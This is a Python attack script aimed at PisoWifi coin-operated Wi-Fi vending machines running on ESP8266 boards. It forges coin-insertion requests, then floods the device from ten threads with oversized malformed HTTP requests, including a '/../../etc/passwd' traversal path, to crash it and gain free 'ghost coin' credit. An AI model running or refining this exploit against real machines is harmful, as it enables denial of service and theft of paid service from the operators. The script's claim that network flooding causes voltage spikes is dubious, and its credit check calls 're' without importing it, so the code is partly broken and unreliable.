#!/usr/bin/env python3
import requests
import threading
import time
import random
from colorama import Fore, Style, init
import socket

init()

class PisoWifiGhostCoinExploit:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'Mozilla/5.0'}
        self.coin_slot_active = False
        self.credits_before = 0
        self.credits_after = 0

    def _activate_coin_slot(self):
        """Simulate coin insertion to activate the coin slot"""
        print(Fore.YELLOW + "[+] Activating coin slot..." + Style.RESET_ALL)
        try:
            # Try common coin insertion endpoints
            endpoints = ['/insert_coin', '/coin', '/payment']
            for endpoint in endpoints:
                try:
                    r = self.session.post(
                        f"{self.base_url}{endpoint}",
                        data={'amount': '1'},  # Simulate 1 peso insertion
                        timeout=2
                    )
                    if r.status_code == 200:
                        self.coin_slot_active = True
                        print(Fore.GREEN + "[+] Coin slot activated!" + Style.RESET_ALL)
                        return True
                except:
                    continue
            print(Fore.RED + "[-] Failed to activate coin slot" + Style.RESET_ALL)
            return False
        except:
            return False

    def _crash_esp8266(self):
        """Flood ESP8266 with malformed requests to trigger BOD reset"""
        print(Fore.YELLOW + "[+] Crashing ESP8266..." + Style.RESET_ALL)
        
        # List of vulnerable endpoints
        crash_endpoints = [
            '/config', '/admin', '/fwupdate',
            '/cmd', '/.htaccess', '/../../etc/passwd'
        ]
        
        # Create raw socket for low-level packet flooding
        def send_crash_packets():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            try:
                s.connect((self.target_ip, 80))
                for _ in range(50):  # Send 50 malformed packets
                    try:
                        s.sendall(
                            b"GET /" + random.choice(crash_endpoints).encode() + 
                            b" HTTP/1.1\r\nHost: " + self.target_ip.encode() + 
                            b"\r\nX-Crash: " + b"A"*5000 + b"\r\n\r\n"
                        )
                    except:
                        break
            except:
                pass
            finally:
                s.close()

        # Launch multiple threads for maximum disruption
        threads = []
        for _ in range(10):  # 10 concurrent flooders
            t = threading.Thread(target=send_crash_packets)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()

        print(Fore.GREEN + "[+] ESP8266 crash attempt complete" + Style.RESET_ALL)

    def _check_credits(self):
        """Check current credit balance"""
        try:
            # Try multiple common credit endpoints
            endpoints = ['/status', '/balance', '/api/credits']
            for endpoint in endpoints:
                try:
                    r = self.session.get(f"{self.base_url}{endpoint}", timeout=2)
                    if r.status_code == 200:
                        # Parse credit value from different response formats
                        if 'application/json' in r.headers.get('Content-Type', ''):
                            data = r.json()
                            if 'credits' in data:
                                return float(data['credits'])
                        else:
                            match = re.search(r'(credits|balance)[:\s]*P?(\d+)', r.text, re.I)
                            if match:
                                return float(match.group(2))
                except:
                    continue
            return 0
        except:
            return 0

    def exploit(self):
        """Full exploit chain"""
        print(Fore.BLUE + """
        PisoWifi Ghost Coin Exploit
        ---------------------------
        Triggers voltage spikes on ESP8266-based systems
        when coin slot is active to generate ghost coins
        """ + Style.RESET_ALL)

        # Step 1: Get initial credits
        self.credits_before = self._check_credits()
        print(Fore.GREEN + f"[+] Initial credits: P{self.credits_before}" + Style.RESET_ALL)

        # Step 2: Activate coin slot
        if not self._activate_coin_slot():
            return False

        # Step 3: Crash ESP8266 during active coin slot
        self._crash_esp8266()

        # Step 4: Verify ghost coins
        time.sleep(5)  # Wait for system to recover
        self.credits_after = self._check_credits()

        if self.credits_after > self.credits_before:
            print(Fore.GREEN + 
                f"[+] Exploit successful! Credits increased from P{self.credits_before} to P{self.credits_after}" + 
                Style.RESET_ALL)
            return True
        else:
            print(Fore.RED + "[-] No ghost coins detected" + Style.RESET_ALL)
            print(Fore.YELLOW + "[*] Possible reasons:" + Style.RESET_ALL)
            print("  1. Coin slot wasn't properly activated")
            print("  2. ESP8266 has power spike protection")
            print("  3. Firmware has crash recovery safeguards")
            return False

if __name__ == "__main__":
    target_ip = input("Enter target PisoWifi IP: ").strip()
    exploit = PisoWifiGhostCoinExploit(target_ip)
    exploit.exploit()